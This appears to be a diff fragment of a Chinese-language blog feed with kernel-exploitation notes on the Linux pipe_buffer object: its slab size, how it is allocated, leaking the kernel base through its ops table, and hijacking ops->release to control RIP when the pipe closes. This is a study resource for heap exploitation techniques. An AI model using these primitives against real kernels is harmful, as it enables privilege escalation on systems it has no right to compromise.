+	const struct pipe_buf_operations *ops;		// &lt;-------- 函数表
+	unsigned int flags;
+	unsigned long private;
+};
+
+struct pipe_buf_operations {
+	int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);	// 确保 pipe buffer 中的数据有效，有效则返回0，无效则返回负值错误码。
+	void (*release)(struct pipe_inode_info *, struct pipe_buffer *);// &lt;-------- 释放 pipe buffer
+	bool (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);
+	bool (*get)(struct pipe_inode_info *, struct pipe_buffer *);
+};
+</code></pre>
+<h2 id="size-10">size：</h2>
+<p>0x370 kmalloc-1024</p>
+<h2 id="利用-10">利用：</h2>
+<pre><code class="language-c">// pipe() -&gt; do_pipe2() -&gt; __do_pipe_flags() -&gt; create_pipe_files() -&gt; get_pipe_inode() -&gt; alloc_pipe_info() —— 分配大小为0x370（默认16个page，16*0x28=0x370）
+struct pipe_inode_info *alloc_pipe_info(void)
+{
+	// .....
+	pipe-&gt;bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),
+			     GFP_KERNEL_ACCOUNT);
+	// .....
+}
+
+int fd[2];
+pipe(fd);
+write(fd[1], &quot;pwn&quot;, 3);
+</code></pre>
+<p>可通过ops泄露内核基址，ops指向pipe_buf_operations函数表</p>
+<p>可通过劫持pipe_buffer-&gt;ops-&gt;release来劫持RIP，close pipe的时候，触发链</p>
+<ul>
+<li>pipe_release() -&gt; put_pipe_info() -&gt; free_pipe_info -&gt; pipe_buf_release() 调用<code>pipe_buffer-&gt;ops-&gt;release</code> 函数</li>
+</ul>
+<h1 id="packet_socket">packet_socket</h1>
+<h1 id="sk_buff">sk_buff</h1>
+]]></content>
+    </entry>
+</feed>
